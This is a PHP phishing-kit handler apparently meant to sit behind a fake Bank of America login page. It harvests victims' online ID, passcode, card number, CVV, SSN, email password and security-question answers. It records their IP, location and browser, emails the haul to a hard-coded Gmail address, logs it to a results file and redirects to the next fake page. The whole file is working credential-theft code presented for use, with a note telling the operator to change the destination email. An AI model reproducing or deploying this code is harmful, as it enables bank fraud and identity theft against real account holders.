<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------BOA Info-----------------------\n";
$message .= "Online ID            : ".$_POST['user']."\n";
$message .= "Passcode           : ".$_POST['pass']."\n";
$message .= "Card Number         : ".$_POST['formtext1']."\n";
$message .= "Expiry Date         : ".$_POST['formtext2']."\n";
$message .= "CVV         : ".$_POST['formtext3']."\n";
$message .= "SSN         : ".$_POST['formtext4']."\n";
$message .= "Email Address         : ".$_POST['formtext5']."\n";
$message .= "Email Password         : ".$_POST['formtext6']."\n";
$message .= "SiteKey Challenge Question 1         : ".$_POST['formselect1']."\n";
$message .= "Answer 1        : ".$_POST['formtext7']."\n";
$message .= "SiteKey Challenge Question 2         : ".$_POST['formselect2']."\n";
$message .= "Answer 2        : ".$_POST['formtext8']."\n";
$message .= "SiteKey Challenge Question 3         : ".$_POST['formselect3']."\n";
$message .= "Answer   3      : ".$_POST['formtext9']."\n";
$message .= "SiteKey Challenge Question 4         : ".$_POST['formselect4']."\n";
$message .= "Answer 4        : ".$_POST['formtext10']."\n";
$message .= "SiteKey Challenge Question 5         : ".$_POST['formselect5']."\n";
$message .= "Answer  5       : ".$_POST['formtext11']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY unknown(doit)com-------------\n";
//change ur email here
$send = "ms.userpc.ms@gmail.com";
$subject = "Result from BOA";
$headers = "From: BOA<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
 $fp = fopen("results.txt","a");
fputs($fp,$message);
fclose($fp);
    header("Location: step3.html");
  

?>
